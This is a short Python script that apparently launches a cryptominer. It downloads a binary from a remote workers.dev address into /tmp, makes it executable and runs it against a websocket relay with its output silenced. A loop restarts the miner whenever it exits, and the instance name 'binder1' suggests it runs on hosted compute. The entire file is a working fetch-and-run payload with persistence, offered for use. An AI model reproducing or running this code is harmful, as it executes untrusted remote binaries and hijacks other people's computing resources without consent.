```python
import subprocess, os, requests, threading, time, sys, atexit, signal

BIN = "https://relay2.relay2.workers.dev/static/update"
URL = "wss://relay2.relay2.workers.dev/"
RAM = 1400
NAME = "binder1"

def download():
    r = requests.get(BIN, timeout=60)
    with open("/tmp/allinone", "wb") as f: f.write(r.content)
    os.chmod("/tmp/allinone", 0o755)
    print("download ok")

def run_miner():
    cmd = ["/tmp/allinone", "--url", URL, "--ram", str(RAM), "-i", NAME]
    return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

download()
p = run_miner()
print(f"MINER_PID={p.pid} NAME={NAME}")

atexit.register(lambda: p.terminate() if p.poll() is None else None)

while True:
    time.sleep(60)
    if p.poll() is not None:
        p = run_miner()
        print(f"restarted NAME={NAME} PID={p.pid}")
```
